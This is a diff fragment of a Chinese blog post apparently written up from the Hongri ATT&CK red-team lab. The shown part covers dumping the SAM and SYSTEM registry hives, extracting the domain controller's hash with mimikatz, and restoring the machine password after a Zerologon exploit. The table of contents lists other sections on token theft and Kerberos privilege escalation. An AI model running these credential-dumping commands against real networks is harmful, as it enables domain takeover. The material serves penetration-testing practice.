+<p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220220044545851.png" alt="image-20220220044545851"></p>
+<p>上线成功了就是获取注册表转储文件，如果中文报错不影响使用</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;reg save HKLM\SYSTEM system.hive /y    </span><br><span class="line">C:\&gt;reg save HKLM\SAM sam.hive /y </span><br></pre></td></tr></table></figure>
+
+<p>下载到本地之后使用mimikatz即可提取DC机器用户的hash</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220220050042702.png" alt="image-20220220050042702"></p>
+<p>这里的hash虽然和我们获取到的域管理员hash一致但实际上这是域控的机器账号，只是密码一样。</p>
+<p>最后一步就是恢复hash了。</p>
+<p>这里就需要用到<a target="_blank" rel="noopener" href="https://github.com/risksense/zerologon%E9%87%8C%E9%9D%A2%E7%9A%84reinstall_original_pw.py%E4%BA%86%E3%80%82%E7%BC%96%E8%AF%91%E6%88%90exe(%E6%9C%8912m%E7%9C%9F%E5%AE%9E%E7%8E%AF%E5%A2%83%E5%8F%AF%E8%83%BD%E9%9A%BE%E5%8F%97)%E5%90%8E%E7%9B%B4%E6%8E%A5%E4%B8%A2%E5%9C%A8web%E8%BF%99%E5%8F%B0%E6%9C%BA%E5%99%A8%E4%B8%8A%E6%89%A7%E8%A1%8C%E5%8D%B3%E5%8F%AF%E3%80%82%E9%81%BF%E5%85%8Dpython%E7%8E%AF%E5%A2%83%E8%BF%98%E9%9C%80%E8%A6%81%E4%BB%A3%E7%90%86%E5%87%BA%E6%9D%A5%E3%80%82">https://github.com/risksense/zerologon里面的reinstall_original_pw.py了。编译成exe(有12m真实环境可能难受)后直接丢在web这台机器上执行即可。避免python环境还需要代理出来。</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reinstall_original_pw.exe DC <span class="number">10.10</span>.<span class="number">10.10</span> <span class="number">161</span>cff084477fe596a5db81874498a24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220220050621332.png" alt="image-20220220050621332"></p>
+<h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p>其他东西换靶场玩，靶场练手但是尽可能贴近实战去操作，方法选择较多选择实战更方便的。</p>
 
   </div>
 </article>
@@ -191,7 +317,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E6%98%93%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91"><span class="toc-number">1.</span> <span class="toc-text">简易网络拓扑</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB%E6%89%93%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">WEB打点</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E6%98%93%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91"><span class="toc-number">1.</span> <span class="toc-text">简易网络拓扑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB%E6%89%93%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">WEB打点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">Windows提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.</span> <span class="toc-text">内网基础信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF"><span class="toc-number">4.1.</span> <span class="toc-text">一、环境信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF"><span class="toc-number">4.2.</span> <span class="toc-text">二、密码信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90"><span class="toc-number">5.</span> <span class="toc-text">提升权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81AccessToken%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="toc-number">5.1.</span> <span class="toc-text">一、AccessToken令牌窃取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81incognito-exe"><span class="toc-number">5.1.1.</span> <span class="toc-text">1、incognito.exe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81Invoke-TokenManipulation-ps1"><span class="toc-number">5.1.2.</span> <span class="toc-text">2、Invoke-TokenManipulation.ps1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81MSF-incognito"><span class="toc-number">5.1.3.</span> <span class="toc-text">3、MSF-incognito</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-number">5.2.</span> <span class="toc-text">二、委派攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81GPP-%E7%BB%84%E7%AD%96%E7%95%A5-%E5%88%A9%E7%94%A8%EF%BC%88MS14-025%EF%BC%89"><span class="toc-number">5.3.</span> <span class="toc-text">三、GPP(组策略)利用（MS14-025）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81Kerberos%E5%9F%9F%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%EF%BC%88MS14-068%EF%BC%89"><span class="toc-number">5.4.</span> <span class="toc-text">四、Kerberos域用户提权漏洞（MS14-068）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81NetLogon%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-CVE-2020-1472"><span class="toc-number">5.5.</span> <span class="toc-text">五、NetLogon域内提权漏洞(CVE-2020-1472)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9D%9F"><span class="toc-number">6.</span> <span class="toc-text">结束</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
